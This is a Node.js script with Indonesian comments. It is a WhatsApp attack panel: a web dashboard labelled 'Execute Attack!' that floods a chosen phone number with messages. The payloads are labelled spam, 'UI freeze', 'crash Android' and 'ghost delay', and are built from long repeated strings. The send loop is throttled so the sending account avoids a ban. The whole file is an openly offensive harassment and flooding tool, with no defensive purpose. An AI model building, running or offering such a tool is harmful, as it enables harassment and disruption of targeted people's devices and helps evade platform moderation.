const { Client, LocalAuth } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');
const express = require('express');
const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));

const client = new Client({
    authStrategy: new LocalAuth(),
    puppeteer: { 
        headless: true, 
        args: ['--no-sandbox', '--disable-setuid-sandbox'] 
    }
});

client.on('qr', (qr) => {
    console.log('SCAN QR INI, JANGAN LAMA-LAMA:');
    qrcode.generate(qr, {small: true});
});

client.on('ready', () => {
    console.log('\n====================================');
    console.log('PANEL BUG JALAN: http://localhost:3000');
    console.log('====================================\n');
});

// --- UI DASHBOARD SANGAR ---
app.get('/', (req, res) => {
    res.send(`
        <html>
        <head>
            <title>DN SCRIPTS - WA BUG</title>
            <style>
                body { background: #050505; color: white; font-family: 'Courier New', sans-serif; display: flex; justify-content: center; padding: 20px; }
                .card { width: 100%; max-width: 380px; background: #0f0f0f; border-radius: 15px; border: 1px solid #ff0055; overflow: hidden; box-shadow: 0 0 20px #ff005544; }
                .banner { width: 100%; height: 150px; background: linear-gradient(rgba(0,0,0,0.5), #0f0f0f), url('https://wallpapercave.com/wp/wp10503071.jpg'); background-size: cover; display: flex; align-items: center; justify-content: center; }
                .content { padding: 20px; }
                label { color: #ff0055; font-size: 11px; font-weight: bold; text-transform: uppercase; display: block; margin-bottom: 5px; }
                input, select { width: 100%; background: #1a1a1a; border: 1px solid #333; padding: 12px; color: white; border-radius: 8px; margin-bottom: 15px; outline: none; }
                button { width: 100%; background: #ff0055; color: white; padding: 15px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
                button:hover { background: #cc0044; box-shadow: 0 0 10px #ff0055; }
                .status { font-size: 10px; color: #666; text-align: center; margin-top: 10px; }
            </style>
        </head>
        <body>
            <div class="card">
                <div class="banner"><h2 style="color:#ff0055; text-shadow: 0 0 10px #ff0055;">DN RULLZSY</h2></div>
                <div class="content">
                    <form action="/attack" method="POST">
                        <label>Target Number</label>
                        <input type="text" name="number" placeholder="62812xxxxx" required>
                        
                        <label>Select Payload / Bug</label>
                        <select name="type">
                            <option value="spam">💥 FAST SPAM</option>
                            <option value="freeze">☣️ UI FREEZE (Heavy Text)</option>
                            <option value="crash">💀 CRASH ANDROID (Buffer)</option>
                            <option value="delay">🌫️ GHOST DELAY</option>
                        </select>

                        <label>Count / Loop</label>
                        <input type="number" name="count" value="10">

                        <button type="submit">Execute Attack!</button>
                    </form>
                    <div class="status">SYSTEM VERSION 1.0.4 - STABLE</div>
                </div>
            </div>
        </body>
        </html>
    `);
});

// --- LOGIKA EKSEKUSI ---
app.post('/attack', async (req, res) => {
    const { number, type, count } = req.body;
    const chatId = number + "@c.us";
    let text = "DN-BUG-";

    if (type === "freeze") text = "░".repeat(10000); // Teks berat bikin lag
    if (type === "spam") text = "🔥 SPAMMED BY FINAS HUB 🔥";
    if (type === "crash") text = "Buffer-Crash-".repeat(1000);
    if (type === "delay") text = " ".repeat(4000) + "Invisible-Lag";

    console.log(`[!] Menyerang ${number} | Mode: ${type} | Jumlah: ${count}`);

    for (let i = 0; i < count; i++) {
        try {
            await client.sendMessage(chatId, text);
            console.log(`[✔] Packet ${i+1} sent.`);
            await new Promise(r => setTimeout(r, 700)); // Jeda agar tidak langsung banned
        } catch (e) {
            console.log("Error: " + e);
        }
    }
    res.send('<h1>SERANGAN TERKIRIM!</h1><a href="/" style="color:red;">KEMBALI KE PANEL</a>');
});

app.listen(3000);
client.initialize();